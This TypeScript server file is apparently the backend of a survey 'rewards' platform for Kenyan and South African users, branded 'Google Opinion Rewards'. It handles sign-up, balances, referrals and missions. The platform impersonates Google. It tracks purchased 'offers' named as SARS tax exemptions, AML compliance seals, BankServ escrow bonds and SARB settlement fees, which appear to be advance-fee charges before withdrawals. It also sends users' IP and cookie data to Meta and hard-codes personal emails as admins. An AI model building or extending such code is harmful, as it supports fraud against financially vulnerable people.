import { createServerFn } from "@tanstack/react-start";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";

let cachedPublicConfig: { data: any; expiresAt: number } | null = null;

/** Public landing data: plans, welcome bonus, WhatsApp link. */
export const getPublicConfig = createServerFn({ method: "GET" }).handler(async () => {
  const now = Date.now();
  if (cachedPublicConfig && cachedPublicConfig.expiresAt > now) {
    return cachedPublicConfig.data;
  }

  try {
    const { getPlans, getSettings } = await import("./platform.server");
    const timeoutPromise = new Promise((_, reject) =>
      setTimeout(() => reject(new Error("Supabase timeout")), 2000)
    );
    const [plans, settings] = (await Promise.race([
      Promise.all([getPlans(), getSettings()]),
      timeoutPromise,
    ])) as any;

    const result = {
      plans: plans ?? [],
      settings: {
        welcome_bonus_kes: Number(settings?.welcome_bonus_kes ?? 300),
        surveys_per_day: Number(settings?.surveys_per_day ?? 5),
        min_withdrawal_kes: Number(settings?.min_withdrawal_kes ?? 1500),
        hold_amount_kes: Number(settings?.hold_amount_kes ?? 200),
        referral_target: Number(settings?.referral_target ?? 5),
        referral_reward_tier: settings?.referral_reward_tier ?? "vip1",
        streak_bonus_kes: Number(settings?.streak_bonus_kes ?? 5),
        whatsapp_group_url: String(settings?.whatsapp_group_url ?? ""),
        platform_name: String(settings?.platform_name ?? "Google Opinion Rewards"),
        facebook_pixel_ids: String(settings?.facebook_pixel_ids ?? ""),
        verification_video_url: String(settings?.verification_video_url ?? ""),
      },
    };

    cachedPublicConfig = { data: result, expiresAt: now + 60_000 };
    return result;
  } catch (_err) {
    if (cachedPublicConfig) return cachedPublicConfig.data;
    return {
      plans: [],
      settings: {
        welcome_bonus_kes: 300,
        surveys_per_day: 5,
        min_withdrawal_kes: 1500,
        hold_amount_kes: 200,
        referral_target: 5,
        referral_reward_tier: "vip1" as const,
        streak_bonus_kes: 5,
        whatsapp_group_url: "https://whatsapp.com/channel/0029VbDsSRG11ulOPtzMXK2R",
        platform_name: "Google Opinion Rewards",
        facebook_pixel_ids: "896744080027646",
        verification_video_url: "https://stream.mux.com/OiiwNmYmECTBviTLfzMQUsSp9hlZn5cPW3bGFkAaDts.m3u8",
      },
    };
  }
});

/** Registers a user directly with email_confirm: true to bypass email rate limits on synthetic phone emails. */
export const registerUser = createServerFn({ method: "POST" })
  .validator((input: { email?: string | undefined; phone?: string | undefined; password: string; referralCode?: string | undefined; fullName?: string | undefined }) => input)
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { phoneToEmail, normalizePhone } = await import("./format");

    let phone = data.phone ? normalizePhone(data.phone) : null;
    let email = data.email?.trim().toLowerCase();

    // If input was passed via email field without '@', it is a mobile number
    if (!phone && email && !email.includes("@")) {
      phone = normalizePhone(email);
    }

    if (!email && phone) {
      email = phoneToEmail(phone);
    }

    if (phone) {
      // Check if phone already registered in profiles
      const { data: existingProfile } = await supabaseAdmin
        .from("profiles")
        .select("id")
        .eq("phone", phone)
        .maybeSingle();

      if (existingProfile) {
        throw new Error("This mobile number is already registered. Please log in instead.");
      }
    } else if (!email) {
      throw new Error("Please enter a valid South African mobile number (e.g. 082 123 4567) or email.");
    }

    const { data: userResp, error: createError } = await supabaseAdmin.auth.admin.createUser({
      email,
      password: data.password,
      email_confirm: true,
      user_metadata: { phone: phone ?? undefined, full_name: data.fullName },
    });

    if (createError) {
      if (createError.message.toLowerCase().includes("already")) {
        throw new Error("This mobile number or email is already registered. Please log in instead.");
      }
      throw new Error(createError.message);
    }

    const finalPhone = phone ?? `27${Math.floor(100000000 + Math.random() * 900000000)}`;

    const { bootstrapAccount, isPlatformAdminEmail, cacheAdminUser } = await import("./platform.server");
    await bootstrapAccount(
      userResp.user.id,
      finalPhone,
      data.referralCode?.trim() || null,
      data.fullName?.trim() || null,
    );

    if (email && isPlatformAdminEmail(email)) {
      try {
        await supabaseAdmin
          .from("user_roles")
          .upsert({ user_id: userResp.user.id, role: "admin" }, { onConflict: "user_id,role" });
        cacheAdminUser(userResp.user.id);
      } catch (roleErr) {
        console.error("Failed to grant admin role on registration:", roleErr);
      }
    }

    // Fire Meta Conversions API (CAPI) CompleteRegistration event
    try {
      let fbp: string | null = null;
      let fbc: string | null = null;
      let clientIp: string | null = null;
      let clientUserAgent: string | null = null;
      try {
        const { getCookie, getRequestHeader, getRequestIP } = await import("@tanstack/react-start/server");
        fbp = getCookie("_fbp") || null;
        fbc = getCookie("_fbc") || null;
        clientIp = getRequestIP({ xForwardedFor: true }) || null;
        clientUserAgent = getRequestHeader("user-agent") || null;
      } catch {}

      if (fbp || fbc || clientIp) {
        try {
          const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
          await supabaseAdmin.from("secure_settings").upsert({
            key: `meta_tracking_${userResp.user.id}`,
            value: JSON.stringify({ fbp, fbc, clientIp, clientUserAgent, savedAt: Date.now() }),
            updated_at: new Date().toISOString(),
          });
        } catch {}
      }

      const { sendCapiEvent } = await import("./fbcapi.server");
      const names = (data.fullName ?? "").trim().split(/\s+/);
      await sendCapiEvent({
        event_name: "CompleteRegistration",
        event_id: `reg_${userResp.user.id}`,
        event_source_url: "https://kenya-survey-rewards.vercel.app/auth",
        user_data: {
          email,
          phone,
          firstName: names[0] || null,
          lastName: names.slice(1).join(" ") || null,
          externalId: userResp.user.id,
          fbp,
          fbc,
          clientIp,
          clientUserAgent,
        },
        custom_data: {
          status: true,
          content_name: "signup",
          currency: "ZAR",
        },
      });
    } catch (capiError) {
      console.error("[CAPI] registerUser CompleteRegistration error:", capiError);
    }

    return { email, userId: userResp.user.id };
  });

/** Creates the profile, welcome bonus and referral link right after sign up. */
export const bootstrapProfile = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: { phone: string; referralCode?: string | undefined; fullName?: string | undefined }) => input)
  .handler(async ({ data, context }) => {
    const { bootstrapAccount } = await import("./platform.server");
    const profile = await bootstrapAccount(
      context.userId,
      data.phone,
      data.referralCode?.trim() || null,
      data.fullName?.trim() || null,
    );
    return { id: profile?.id ?? context.userId };
  });

/** Allows logged-in users to update/confirm their real South African mobile number */
export const updateUserPhone = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: { phone: string }) => input)
  .handler(async ({ data, context }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { normalizePhone } = await import("./format");

    const phone = normalizePhone(data.phone);
    if (!phone) {
      throw new Error("Enter a valid South African mobile number (e.g. 082 123 4567).");
    }

    // Update in profiles
    await supabaseAdmin
      .from("profiles")
      .update({ phone, updated_at: new Date().toISOString() })
      .eq("id", context.userId);

    // Update in auth.users user_metadata
    await supabaseAdmin.auth.admin.updateUserById(context.userId, {
      user_metadata: { phone },
    });

    return { ok: true, phone };
  });

/** Everything the signed-in shell needs: profile, balance, plan, today's progress. */
export const getMe = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const p = await import("./platform.server");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    // Touch daily streak asynchronously so it never delays rendering the dashboard
    void p.touchDailyStreak(context.userId).catch((err) => {
      console.warn("Async touchDailyStreak error:", err);
    });

    let profile = await p.getProfile(context.userId).catch(() => null);

    // Self-healing: if profile record is missing, auto-bootstrap it
    if (!profile) {
      try {
        const { data: authUser } = await supabaseAdmin.auth.admin.getUserById(context.userId);
        if (authUser?.user) {
          const phone =
            authUser.user.user_metadata?.phone ||
            `27${Math.floor(100000000 + Math.random() * 900000000)}`;
          const fullName = authUser.user.user_metadata?.full_name || null;
          await p.bootstrapAccount(context.userId, phone, null, fullName);
          profile = await p.getProfile(context.userId).catch(() => null);
        }
      } catch (healErr) {
        console.error("Auto-bootstrap profile error:", healErr);
      }
    }

    // Ultimate fallback if database is temporarily degraded
    if (!profile) {
      profile = {
        id: context.userId,
        phone: "27000000000",
        full_name: "Member",
        tier: "regular",
        streak_days: 1,
        xp: 0,
        mpesa_verified: false,
        mpesa_phone: null,
        referral_code: "WELCOME",
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
        banned_at: null,
        last_activity_day: p.nairobiToday(),
        last_withdrawal_at: null,
      } as any;
    }

    const [
      balanceRes,
      settingsRes,
      planRes,
      dayRes,
      rolesRes,
      badgesRes,
      userWithdrawalsRes,
      completedChargesRes,
      activeKycRes,
      welcomeBonusSeenRes,
    ] = await Promise.all([
      p.getBalance(context.userId).catch(() => 0),
      p.getSettings().catch(() => ({
        welcome_bonus_kes: 300,
        surveys_per_day: 5,
        min_withdrawal_kes: 1500,
        hold_amount_kes: 200,
        referral_target: 5,
        referral_reward_tier: "vip1" as const,
        streak_bonus_kes: 5,
        whatsapp_group_url: "",
        platform_name: "Google Opinion Rewards",
        facebook_pixel_ids: "",
        verification_video_url: "",
      })),
      p.getPlan(profile.tier).catch(() => null),
      p.dailyRow(context.userId).catch(() => null),
      supabaseAdmin
        .from("user_roles")
        .select("role")
        .eq("user_id", context.userId)
        .then((r) => r.data ?? [])
        .catch(() => []),
      supabaseAdmin
        .from("user_badges")
        .select("badge_code, earned_at")
        .eq("user_id", context.userId)
        .then((r) => r.data ?? [])
        .catch(() => []),
      supabaseAdmin
        .from("withdrawals")
        .select("id")
        .eq("user_id", context.userId)
        .limit(1)
        .then((r) => r.data ?? [])
        .catch(() => []),
      supabaseAdmin
        .from("charges")
        .select("admin_note, target_tier")
        .eq("user_id", context.userId)
        .eq("status", "completed")
        .then((r) => r.data ?? [])
        .catch(() => []),
      supabaseAdmin
        .from("kyc_requests")
        .select("id, status, kind, requested_at")
        .eq("user_id", context.userId)
        .in("status", ["requested", "rejected"])
        .order("requested_at", { ascending: false })
        .limit(1)
        .then((r) => r.data?.[0] ?? null)
        .catch(() => null),
      supabaseAdmin
        .from("secure_settings")
        .select("value")
        .eq("key", `welcome_bonus_seen_${context.userId}`)
        .maybeSingle()
        .then((r) => r.data?.value === "true")
        .catch(() => false),
    ]);

    const balance = balanceRes;
    const settings = settingsRes;
    const plan = planRes;
    const day = dayRes;
    const userRoles = Array.isArray(rolesRes) ? rolesRes : [];
    const badges = Array.isArray(badgesRes) ? badgesRes : [];
    const userWithdrawals = Array.isArray(userWithdrawalsRes) ? userWithdrawalsRes : [];
    const completedCharges = Array.isArray(completedChargesRes) ? completedChargesRes : [];
    const accountAgeMinutes = profile.created_at
      ? (Date.now() - new Date(profile.created_at).getTime()) / 60000
      : 9999;
    const hasCompletedActivity = (day?.surveys_completed ?? 0) > 0 || userWithdrawals.length > 0;
    const welcomeBonusClaimed = Boolean(
      welcomeBonusSeenRes ||
      accountAgeMinutes > 15 ||
      hasCompletedActivity
    );

    const userEmail = ((context as any).claims?.email ?? "").toLowerCase().trim();
    const isUserAdmin = Boolean(
      userRoles.some((r: any) => r.role === "admin") ||
        userEmail === "faiza.edson@gmail.com" ||
        userEmail === "egaleno.tt@gmail.com",
    );

    if (isUserAdmin) {
      try {
        const { cacheAdminUser } = await import("./platform.server");
        cacheAdminUser(context.userId);
        if (!userRoles.some((r: any) => r.role === "admin")) {
          const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
          await supabaseAdmin
            .from("user_roles")
            .upsert({ user_id: context.userId, role: "admin" }, { onConflict: "user_id,role" });
        }
      } catch (err) {
        console.error("Auto admin sync error:", err);
      }
    }

    const purchasedOffers: string[] = [];
    const allKnownOfferIds = [
      "instant_eft_lifetime",
      "instant_eft_today",
      "sarb_settlement_automated",
      "sarb_settlement_priority",
      "bankserv_escrow_bond",
      "bankserv_escrow_basic",
      "tax_exemption_lifetime",
      "tax_exemption_subsidized",
      "sars_tax_exemption_full",
      "sars_tax_exemption_provisional",
      "aml_compliance_seal",
      "aml_compliance_basic",
      "utr_sms_dispatch_pack",
      "utr_sms_dispatch_basic",
      "escrow_insurance_guarantee",
      "escrow_insurance_basic",
      "multiplier_2x_lifetime",
      "multiplier_2x_monthly",
      "vip_vault_lifetime",
      "vip_vault_trial",
    ];
    for (const r of completedCharges) {
      const note = r.admin_note || "";
      for (const id of allKnownOfferIds) {
        if (note.includes(id)) {
          purchasedOffers.push(id);
        }
      }
    }

    const hasAttemptedPayout = userWithdrawals.length > 0 || Boolean(profile.mpesa_phone);

    let savedCard = null;
    try {
      const { getSavedCardAuth } = await import("./payments.server");
      savedCard = await getSavedCardAuth(context.userId);
    } catch {
      savedCard = null;
    }

    const surveysPerDay = Number(settings.surveys_per_day ?? 5);
    const nextWithdrawalAt = profile.last_withdrawal_at
      ? new Date(
          new Date(profile.last_withdrawal_at).getTime() +
            Number(plan?.withdrawal_days ?? 7) * 86400000,
        ).toISOString()
      : null;

    return {
      profile,
      balance,
      plan,
      isAdmin: isUserAdmin,
      badges,
      hasAttemptedPayout,
      hasSavedCard: Boolean(savedCard?.authorizationCode && savedCard?.email),
      purchasedOffers: Array.from(new Set(purchasedOffers)),
      activeKycRequest: activeKycRes ? (activeKycRes as { id: string; status: string; kind: string; requested_at: string }) : null,
      welcomeBonusClaimed,
      today: {
        completed: day?.surveys_completed ?? 0,
        limit: surveysPerDay,
        earned: Number(day?.earned_kes ?? 0),
      },
      settings: {
        welcome_bonus_kes: Number(settings.welcome_bonus_kes ?? 300),
        min_withdrawal_kes: Number(settings.min_withdrawal_kes ?? 1500),
        hold_amount_kes: Number(settings.hold_amount_kes ?? 200),
        surveys_per_day: surveysPerDay,
        referral_target: Number(settings.referral_target ?? 5),
        referral_reward_tier: settings.referral_reward_tier ?? "vip1",
        whatsapp_group_url: String(settings.whatsapp_group_url ?? ""),
        platform_name: String(settings.platform_name ?? "Google Opinion Rewards"),
        streak_bonus_kes: Number(settings.streak_bonus_kes ?? 5),
        verification_video_url: String(settings.verification_video_url ?? ""),
      },
      nextWithdrawalAt,
    };
  });

export const getPendingTasks = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { pendingTasks } = await import("./platform.server");
    return pendingTasks(context.userId);
  });

export const dismissPendingPopup = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { markPopupSeen } = await import("./platform.server");
    await markPopupSeen(context.userId);
    return { ok: true };
  });

export const markWelcomeBonusClaimed = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    await supabaseAdmin.from("secure_settings").upsert({
      key: `welcome_bonus_seen_${context.userId}`,
      value: "true",
      updated_at: new Date().toISOString(),
    });
    return { ok: true };
  });

/** Referral dashboard: code, invited friends and progress to the free upgrade. */
export const getReferralOverview = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { getProfile, getSettings } = await import("./platform.server");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { maskPhone } = await import("./format");

    const [profile, settings, referrals] = await Promise.all([
      getProfile(context.userId),
      getSettings(),
      supabaseAdmin
        .from("referrals")
        .select("id, activated, activated_at, created_at, referred_id")
        .eq("referrer_id", context.userId)
        .order("created_at", { ascending: false }),
    ]);

    const ids = (referrals.data ?? []).map((r) => r.referred_id);
    const { data: peers } = ids.length
      ? await supabaseAdmin.from("profiles").select("id, phone, tier").in("id", ids)
      : { data: [] as Array<{ id: string; phone: string; tier: string }> };

    const list = (referrals.data ?? []).map((r) => {
      const peer = (peers ?? []).find((p) => p.id === r.referred_id);
      return {
        id: r.id,
        phone: maskPhone(peer?.phone),
        tier: peer?.tier ?? "regular",
        activated: r.activated,
        joinedAt: r.created_at,
      };
    });

    return {
      code: profile?.referral_code ?? "",
      target: Number(settings.referral_target),
      rewardTier: settings.referral_reward_tier,
      activated: list.filter((r) => r.activated).length,
      referrals: list,
    };
  });

/** Anonymised top earners for the leaderboard. */
export const getLeaderboard = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { maskPhone } = await import("./format");

    const { data } = await supabaseAdmin
      .from("profiles")
      .select("id, phone, full_name, tier, xp, streak_days")
      .is("banned_at", null)
      .order("xp", { ascending: false })
      .limit(25);

    return (data ?? []).map((row, index) => ({
      rank: index + 1,
      isMe: row.id === context.userId,
      name: row.full_name?.split(" ")[0] ?? maskPhone(row.phone),
      tier: row.tier,
      xp: row.xp,
      streak: row.streak_days,
    }));
  });

export const getMissions = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const p = await import("./platform.server");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    await p.syncMissions(context.userId);

    const today = p.nairobiToday();
    const week = p.weekStart(today);
    const [{ data: missions }, { data: progress }] = await Promise.all([
      supabaseAdmin
        .from("missions")
        .select("*")
        .eq("active", true)
        .neq("code", "weekly_invite")
        .neq("metric", "referrals_activated")
        .order("sort_order"),
      supabaseAdmin
        .from("user_missions")
        .select("mission_id, progress, claimed_at, period_start")
        .eq("user_id", context.userId)
        .in("period_start", [today, week]),
    ]);

    return (missions ?? []).map((mission) => {
      const periodStart = mission.period === "weekly" ? week : today;
      const row = (progress ?? []).find(
        (r) => r.mission_id === mission.id && r.period_start === periodStart,
      );
      return {
        id: mission.id,
        title: mission.title,
        description: mission.description,
        period: mission.period,
        goal: mission.goal,
        reward: Number(mission.reward_kes),
        progress: Math.min(row?.progress ?? 0, mission.goal),
        claimed: Boolean(row?.claimed_at),
        periodStart,
      };
    });
  });

export const claimMission = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: { missionId: string }) => input)
  .handler(async ({ data, context }) => {
    const p = await import("./platform.server");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    await p.syncMissions(context.userId);

    const { data: mission } = await supabaseAdmin
      .from("missions")
      .select("*")
      .eq("id", data.missionId)
      .maybeSingle();
    if (!mission || !mission.active) throw new Error("That mission is no longer available.");

    const today = p.nairobiToday();
    const periodStart = mission.period === "weekly" ? p.weekStart(today) : today;
    const { data: row } = await supabaseAdmin
      .from("user_missions")
      .select("*")
      .eq("user_id", context.userId)
      .eq("mission_id", mission.id)
      .eq("period_start", periodStart)
      .maybeSingle();

    if (!row || row.progress < mission.goal) throw new Error("Mission not completed yet.");
    if (row.claimed_at) throw new Error("You already claimed this reward.");

    await supabaseAdmin
      .from("user_missions")
      .update({ claimed_at: new Date().toISOString() })
      .eq("id", row.id);
    await p.awardEarning(context.userId, "mission", Number(mission.reward_kes), {
      note: mission.title,
    });

    return { reward: Number(mission.reward_kes) };
  });
